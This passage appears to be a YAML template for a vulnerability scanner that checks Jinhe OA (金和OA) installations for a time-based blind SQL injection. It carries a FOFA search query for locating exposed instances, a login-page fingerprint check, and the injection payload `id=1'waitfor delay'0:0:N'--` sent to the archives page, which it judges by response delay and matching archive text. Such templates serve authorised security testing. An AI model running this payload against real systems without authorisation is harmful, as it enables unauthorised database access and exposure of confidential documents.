  severity: high
  tags:
  - sql-injection
  finger: 金和OA
  fofa: app="金和网络-金和OA"
variables:
  t1: random_int(1,3)
  t2: t1 * 4
  t3: t2 + 2
requests:
- method: GET
  path: /C6/Jhsoft.Web.login/PassWordSlideFull.aspx
  expression: contains(body,"JHSoft")
- method: GET
  path: /c6/Jhsoft.Web.Archives/ArchivesInfoAcceptAip.aspx/?id=1'waitfor+delay'0:0:{{.t1}}'--
  expression: 'status_code == 200 &&

    contains(gbk_decode(body),"收文信息") &&

    contains(gbk_decode(body),"秘密等级") &&

    contains(gbk_decode(body),"紧急程度") &&

    duration >= t2 &&

    duration <= t3

    '
transport: http
